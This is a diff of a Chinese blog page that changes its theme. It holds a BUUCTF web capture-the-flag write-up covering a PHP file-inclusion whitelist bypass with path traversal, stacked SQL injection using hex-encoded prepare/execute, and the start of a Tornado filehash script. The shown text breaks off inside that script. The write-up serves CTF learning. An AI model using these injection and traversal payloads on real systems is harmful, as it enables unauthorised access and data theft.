@@ -1,502 +1,632 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
+
+
+
+
+
 <head>
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 4.0.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-  <link rel="alternate" href="/atom.xml" title="Gee" type="application/atom+xml">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Gee">
+  <meta name="keywords" content="">
+  <title>BUUCTF Web WriteUP - Gee</title>
 
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
-
-
-<script id="hexo-configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.5.0',
-    exturl: false,
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    copycode: {"enable":false,"show_result":false,"style":null},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
-    bookmark: {"enable":false,"color":"#222","save":"auto"},
-    fancybox: false,
-    mediumzoom: false,
-    lazyload: false,
-    pangu: false,
-    algolia: {
-      appID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    },
-    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: '',
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    translation: {
-      copy_button: '复制',
-      copy_success: '复制成功',
-      copy_failure: '复制失败'
-    },
-    sidebarPadding: 40
-  };
-</script>
-
-  <meta name="description" content="0x01 Warm Up第一题，开始只有一张图，查看源代码试试，发现了source.php,访问一下source.php,拿到了源码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&amp;lt;?php    highlight_file(__FILE__);    cla">
-<meta property="og:type" content="article">
-<meta property="og:title" content="BUUCTF Web WriteUP">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;04&#x2F;BUUCTF-Web-WriteUP&#x2F;index.html">
-<meta property="og:site_name" content="Gee">
-<meta property="og:description" content="0x01 Warm Up第一题，开始只有一张图，查看源代码试试，发现了source.php,访问一下source.php,拿到了源码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&amp;lt;?php    highlight_file(__FILE__);    cla">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7148.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7149.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7157.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7158.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7159.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7163.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7164.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7165.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7166.JPG">
-<meta property="og:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7167.JPG">
-<meta property="og:updated_time" content="2020-06-10T14:28:35.975Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https:&#x2F;&#x2F;github.com&#x2F;gee617&#x2F;picture&#x2F;raw&#x2F;master&#x2F;%E6%8D%95%E8%8E%B7148.JPG">
-
-<link rel="canonical" href="http://yoursite.com/2020/02/04/BUUCTF-Web-WriteUP/">
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true,
-    isPage: false,
-    isArchive: false
-  };
-</script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
-  <title>BUUCTF Web WriteUP | Gee</title>
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+  
+
   
 
 
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
 
 
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
+  <script  src="/js/utils.js" ></script>
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
 
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-meta">
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
 
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Gee</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
   </div>
-
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-</div>
-
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
-
-  </li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-
 </nav>
-  <div class="site-search">
-    <div class="popup search-popup">
-    <div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="none"
-           placeholder="搜索..." spellcheck="false"
-           type="text" id="search-input">
-  </div>
-  <span class="popup-btn-close">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div id="search-result"></div>
 
-</div>
-<div class="search-pop-overlay"></div>
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container text-center white-text fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
 
-  </div>
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content">
             
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2020-02-04 09:30">
+      2020年2月4日 上午
+    </time>
+  </div>
 
-  <div class="posts-expand">
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
       
+      
+      20
+       分钟
+    </span>
+  
+
   
   
-  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/04/BUUCTF-Web-WriteUP/">
+</div>
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/1.jpg">
-      <meta itemprop="name" content="Gee">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Gee">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          BUUCTF Web WriteUP
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-02-04 09:30:51" itemprop="dateCreated datePublished" datetime="2020-02-04T09:30:51+08:00">2020-02-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-06-10 22:28:35" itemprop="dateModified" datetime="2020-06-10T22:28:35+08:00">2020-06-10</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%A2%98%E8%A7%A3/" itemprop="url" rel="index">
-                    <span itemprop="name">题解</span>
-                  </a>
-                </span>
-            </span>
+            
+          </div>
 
           
-
         </div>
-      </header>
+      </div>
+    </div>
+  </header>
 
+  <main>
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
       
-        <h3 id="0x01-Warm-Up"><a href="#0x01-Warm-Up" class="headerlink" title="0x01 Warm Up"></a>0x01 Warm Up</h3><p>第一题，开始只有一张图，查看源代码试试，发现了source.php,访问一下source.php,拿到了源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&apos;file&apos;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><a id="more"></a><!-- toc -->
 
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <article class="markdown-body">
+              <!-- toc -->
+<h3 id="0x01-Warm-Up"><a href="#0x01-Warm-Up" class="headerlink" title="0x01 Warm Up"></a>0x01 Warm Up</h3><p>第一题，开始只有一张图，查看源代码试试，发现了source.php,访问一下source.php,拿到了源码：</p>
+<pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>
+    highlight_file(<span class="hljs-keyword">__FILE__</span>);
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span>
+    </span>&#123;
+        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span><span class="hljs-params">(&amp;$page)</span>
+        </span>&#123;
+            $whitelist = [<span class="hljs-string">"source"</span>=&gt;<span class="hljs-string">"source.php"</span>,<span class="hljs-string">"hint"</span>=&gt;<span class="hljs-string">"hint.php"</span>];
+            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>($page) || !is_string($page)) &#123;
+                <span class="hljs-keyword">echo</span> <span class="hljs-string">"you can't see it"</span>;
+                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
+            &#125;
 
-<p>在源码中还得知了有个hint.php，访问一下<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7148.JPG" alt="picture"><br>得知flag在ffffllllaaaagggg中，于是就要想办法读取这个文件，接下来分析一下源码，关键是这段代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (! empty($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&apos;file&apos;];</span><br><span class="line">        exit;</span><br></pre></td></tr></table></figure>
+            <span class="hljs-keyword">if</span> (in_array($page, $whitelist)) &#123;
+                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
+            &#125;
+
+            $_page = mb_substr(
+                $page,
+                <span class="hljs-number">0</span>,
+                mb_strpos($page . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>)
+            );
+            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;
+                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
+            &#125;
+
+            $_page = urldecode($page);
+            $_page = mb_substr(
+                $_page,
+                <span class="hljs-number">0</span>,
+                mb_strpos($_page . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>)
+            );
+            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) &#123;
+                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
+            &#125;
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">"you can't see it"</span>;
+            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
+        &#125;
+    &#125;
+
+    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>($_REQUEST[<span class="hljs-string">'file'</span>])
+        &amp;&amp; is_string($_REQUEST[<span class="hljs-string">'file'</span>])
+        &amp;&amp; emmm::checkFile($_REQUEST[<span class="hljs-string">'file'</span>])
+    ) &#123;
+        <span class="hljs-keyword">include</span> $_REQUEST[<span class="hljs-string">'file'</span>];
+        <span class="hljs-keyword">exit</span>;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;
+    &#125;  
+<span class="hljs-meta">?&gt;</span></span></code></pre>
+<p>在源码中还得知了有个hint.php，访问一下<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7148.JPG" srcset="/img/loading.gif" alt="picture"><br>得知flag在ffffllllaaaagggg中，于是就要想办法读取这个文件，接下来分析一下源码，关键是这段代码</p>
+<pre><code class="hljs awk"><span class="hljs-keyword">if</span> (! empty(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'file'</span>])
+        &amp;&amp; is_string(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'file'</span>])
+        &amp;&amp; emmm::checkFile(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'file'</span>])
+    ) &#123;
+        include <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'file'</span>];
+        <span class="hljs-keyword">exit</span>;</code></pre>
 <p>只要满足传给file的值不为空且为字符串以及checkFile($_REQUEST[‘file’])的值为真，具体看一下checkfile（）这个函数，主要是个白名单验证，白名单中只有source.php和hint.php<br>然后检查$page是不是存在于白名单中，接下来再截取$page中？前的字符，并检验是否存在于白名单中，之后进行url解码再检验是否存在于白名单中，于是我们可以构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php%253f</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs mel">?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">source</span>.php%253f</code></pre>
 <p>这里%25解码为%，所以一开始浏览器会对其进行一次解码，变成source.php%3f，%3f解码之后是？，所以再一次解码后变为source.php?，顺利通关，但是我们目的是读取ffffllllaaaagggg，所以可以利用目录穿越<br>../../../../../../../../进行读取，最终payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php%253f/../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7149.JPG" alt="picture"><br>成功拿到flag</p>
+<pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">source</span>.php%<span class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>ffffllllaaaagggg</code></pre>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7149.JPG" srcset="/img/loading.gif" alt="picture"><br>成功拿到flag</p>
 <!-- toc -->
 <h3 id="0x02-随便注"><a href="#0x02-随便注" class="headerlink" title="0x02 随便注"></a>0x02 随便注</h3><p>这道题的考点应该是堆叠注入，首先列出数据库：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;show database;#</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7157.JPG" alt="picture"><br>之后列出表名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;show tables;#</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7158.JPG" alt="picture"><br>猜测flag在表一，但测试发现select是被过滤的。于是想到可以用16进制编码，还有prepare语句，即预编译语句，先prepare语句准备好一个SQL语句，并给他命名，之后调用这个名字即可<br>于是，有了如下payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7159.JPG" alt="picture"></p>
+<pre><code class="hljs sql">1';<span class="hljs-keyword">show</span> <span class="hljs-keyword">database</span>;<span class="hljs-comment">#</span></code></pre>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7157.JPG" srcset="/img/loading.gif" alt="picture"><br>之后列出表名</p>
+<pre><code class="hljs sql">1';<span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<span class="hljs-comment">#</span></code></pre>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7158.JPG" srcset="/img/loading.gif" alt="picture"><br>猜测flag在表一，但测试发现select是被过滤的。于是想到可以用16进制编码，还有prepare语句，即预编译语句，先prepare语句准备好一个SQL语句，并给他命名，之后调用这个名字即可<br>于是，有了如下payload：</p>
+<pre><code class="hljs sql">1';<span class="hljs-keyword">SeT</span>@a=<span class="hljs-number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="hljs-keyword">prepare</span> execsql <span class="hljs-keyword">from</span> @a;<span class="hljs-keyword">execute</span> execsql;<span class="hljs-comment">#</span></code></pre>
+<p><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7159.JPG" srcset="/img/loading.gif" alt="picture"></p>
 <!-- toc -->
 <h3 id="0x03-easy-tornado"><a href="#0x03-easy-tornado" class="headerlink" title="0x03  easy_tornado"></a>0x03  easy_tornado</h3><p>首先看到给出了三个txt文件，依次查看一下 ，先看一下flag.txt 得知flag在/flllllllllag发现这个时候发现url变成了:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c446f9a2-c632-4dbe-91f7-fc8fe0c17e33.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=1afdc686c1f135677a73d6b9610db36c</span><br></pre></td></tr></table></figure>
-<p>猜测有一个是要通过给filename传参，来获取flag，试了一下给filename赋值:/fllllllllllllag,报错了<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7163.JPG" alt="picture"><br>这个时候结合hint.txt的内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs llvm">http://<span class="hljs-keyword">c</span><span class="hljs-number">446</span>f<span class="hljs-number">9</span>a<span class="hljs-number">2</span>-<span class="hljs-keyword">c</span><span class="hljs-number">632</span><span class="hljs-number">-4</span>dbe<span class="hljs-number">-91</span>f<span class="hljs-number">7</span>-fc<span class="hljs-number">8</span>fe<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">17e33</span>.node<span class="hljs-number">3</span>.buuoj.cn/file?filename=/flag.txt&amp;filehash=<span class="hljs-number">1</span>afdc<span class="hljs-number">686</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>f<span class="hljs-number">135677</span>a<span class="hljs-number">73</span>d<span class="hljs-number">6</span>b<span class="hljs-number">9610</span>db<span class="hljs-number">36</span><span class="hljs-keyword">c</span></code></pre>
+<p>猜测有一个是要通过给filename传参，来获取flag，试了一下给filename赋值:/fllllllllllllag,报错了<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7163.JPG" srcset="/img/loading.gif" alt="picture"><br>这个时候结合hint.txt的内容：</p>
+<pre><code class="hljs stylus">/hints<span class="hljs-selector-class">.txt</span>
+<span class="hljs-function"><span class="hljs-title">md5</span><span class="hljs-params">(cookie_secret+md5(filename)</span></span>)</code></pre>
 <p>猜想我们要计算/flllllllllag的filehash的值，方可让他正确回显，于是找了个计算hash的脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!-*-coding:utf-8 -*-</span><br><span class="line">import hashlib</span><br><span class="line"> </span><br><span class="line">def md5value(s):</span><br><span class="line">    md5 = hashlib.md5() </span><br><span class="line">    md5.update(s) </span><br><span class="line">    return md5.hexdigest()</span><br><span class="line"> </span><br><span class="line">def jiami(): </span><br><span class="line">    filename = &apos;/fllllllllllllag&apos;</span><br><span class="line">    cookie_s 